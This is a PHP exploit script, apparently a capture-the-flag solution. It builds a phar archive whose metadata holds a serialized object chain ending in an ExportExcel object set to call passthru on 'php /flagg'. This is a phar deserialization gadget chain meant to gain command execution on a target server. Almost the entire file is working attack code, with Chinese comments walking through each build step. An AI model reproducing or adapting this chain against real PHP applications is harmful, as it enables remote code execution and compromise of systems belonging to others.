class UserInfo
{
    public $username;
    public $nickname;
    public $role;
    public $userFunc;

    public function __construct($username, $nickname, $userFunc, $role = '')
    {
        $this->username = new SuperAdmin("1", "1");;
        $this->nickname = $nickname;
        $this->userFunc = $userFunc;
        $this->role = $role;
    }

}

class SuperAdmin
{
    public $username;
    public $role;
    public $isSuperAdmin;
    public $OwnMember;

    public function __construct($username, $OwnMember, $superAdmin = '', $role = '')
    {
        $this->username = $username;
        $this->OwnMember = $OwnMember;
        $this->isSuperAdmin = new ExportExcel("php /flagg", "b", "passthru");;
        $this->role = $role;
    }

}

class ExportExcel
{

    public $filename;
    public $exportname;
    public $do;

    public function __construct($filename, $exportname, $do)
    {
        $this->filename = $filename;
        $this->exportname = $exportname;
        $this->do = $do;
    }


}

@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$o = new UserInfo("", "", "", "");
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();